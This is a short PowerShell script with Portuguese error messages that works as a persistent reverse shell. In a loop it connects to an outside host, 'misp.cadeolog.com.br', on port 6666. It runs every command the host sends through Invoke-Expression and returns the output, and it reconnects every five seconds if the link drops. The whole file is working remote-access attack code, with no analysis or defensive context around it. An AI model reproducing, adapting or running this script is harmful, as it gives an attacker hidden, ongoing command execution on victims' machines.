function Create-Connection {
    param([string]$ip, [int]$port)
    try {
        $client = New-Object System.Net.Sockets.TcpClient
        $client.Connect($ip, $port)
        return $client
    } catch {
        Write-Output "Erro ao conectar: $_"
        return $null
    }
}

while ($true) {
    $client = Create-Connection -ip 'misp.cadeolog.com.br' -port 6666
    if (-not $client) {
        Start-Sleep -Seconds 5
        continue
    }

    $stream = $client.GetStream()
    $reader = New-Object System.IO.StreamReader($stream)
    $writer = New-Object System.IO.StreamWriter($stream)
    $writer.AutoFlush = $true

    while ($true) {
        try {
            $cmd = $reader.ReadLine()
            if (-not $cmd) {
                Write-Output "Conexão fechada pelo servidor."
                break
            }

            if ([string]::IsNullOrWhiteSpace($cmd)) {
                $writer.WriteLine("Erro: Comando vazio recebido")
            } else {
                try {
                    $output = Invoke-Expression $cmd 2>&1 | Out-String
                    $writer.WriteLine($output)
                } catch {
                    $writer.WriteLine("Erro ao executar comando: $($_.Exception.Message)")
                }
            }
        } catch {
            Write-Output "Erro: $_. Tentando reconectar..."
            break
        }
    }

    if ($stream) { $stream.Close() }
    if ($client) { $client.Close() }
    Start-Sleep -Seconds 5
}
